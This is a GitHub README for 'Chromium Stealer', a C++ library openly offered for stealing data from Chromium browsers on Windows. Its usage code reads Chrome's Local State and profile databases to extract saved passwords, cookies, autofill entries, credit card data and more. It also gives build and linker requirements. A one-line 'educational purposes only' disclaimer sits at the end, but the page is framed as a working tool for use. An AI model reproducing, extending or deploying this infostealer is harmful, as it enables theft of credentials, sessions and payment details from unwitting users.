# 🟩 Chromium Stealer 🟩 <a href="https://github.com/yurtrimu/chromium-stealer/actions/workflows/main.yml"><img src="https://github.com/yurtrimu/chromium-stealer/actions/workflows/main.yml/badge.svg" alt="Working"></a>

## **A lightweight library-kind of project that can steal any kind of data from any chromium browsers.**

# Questions?
### - **I gladly answer your questions on the [discord server](https://discord.gg/QBhFd2aK4r).**

## Usage

```cpp
#include "chromiumstealer.hpp"

int main() {

    // Check operating system
	if (!utils::console::is_windows()) {
		printf("The operating system has to be Windows NT\n");
		exit(EXIT_FAILURE);
	}

    // Set console to utf8 output to evade any gibberish characters
	if (!utils::console::set_utf8()) {
		printf("Couldn't set console IO to utf8 encoding.\nConsole IO could show gibberish texts.\n");
	}

	// Path to any chromium browser's files
	std::string Local_State_Path = "Google\\Chrome\\User Data\\Local State";
	std::string Database_Path = "Google\\Chrome\\User Data\\Default";

    // Define the stealer
	ChromiumStealer Stealer(Local_State_Path, Database_Path);

    // Initialize the stealer
    stealer.initialize();

    // Get any data you want
	std::vector<ChromiumStealer::cookie_data> cookies_data = stealer.get_cookies();
	std::vector<ChromiumStealer::password_data> pass_data = stealer.get_password();
	std::vector<ChromiumStealer::autofill_data> auto_data = stealer.get_autofill();
	std::vector<ChromiumStealer::creditc_data> card_data = stealer.get_credit_card();
	std::vector<ChromiumStealer::keyword_data> key_data = stealer.get_keywords();
	std::vector<ChromiumStealer::status_data> status_data = stealer.get_status();

    // Print the data
    std::string passwords_result = stealer.print_passwords(pass_data);
	std::string cookies_result = stealer.print_cookies(cookies_data);
	std::string autofills_result = stealer.print_autofills(auto_data);
	std::string credit_cards_result = stealer.print_credit_cards(card_data);
	std::string keywords_result = stealer.print_keywords(key_data);
	std::string statuses_result = stealer.print_statuses(status_data);

	printf("\nPasswords Result: %s\n", passwords_result.c_str());
	printf("\nCookies Result: %s\n", cookies_result.c_str());
	printf("\nAutofills Result: %s\n", autofills_result.c_str());
	printf("\nCredit Cards Result: %s\n", credit_cards_result.c_str());
	printf("\nKeywords Result: %s\n", keywords_result.c_str());
	printf("\nStatuses Result: %s\n", statuses_result.c_str());
}
```

## Example.png

![alt text](https://github.com/yurtrimu/chromium-stealer/blob/main/example.png?raw=true)

## Operating System
- **Below Windows 7 - 🟦 Untested**
- **Windows 7 - 🟦 Untested**
- **Windows 10 - 🟩 Working**
- **Windows 11 - 🟦 Untested**
- **Mac OS - 🟥 Not Working**
- **Linux - 🟥 Not Working**

## Requirements

**You need to have the OpenSSL library installed and linked to your compiler.**

- You could download the OpenSSL library from [OpenSSL website](https://www.openssl.org/source/).

## Linker
- **libssl.lib**
- **libcrypto.lib**
- **crypt32.lib**


## Compiling

- **Build - 🟦 Untested**
- **Release - 🟩 Working**
- **C++17 or below - 🟥 Not Working**
- **C++20 - 🟩 Working**

## Contributing

**Pull requests are welcome.**

## Legal Disclaimer
🟥 **The content provided is for educational and informational purposes only.** 🟥
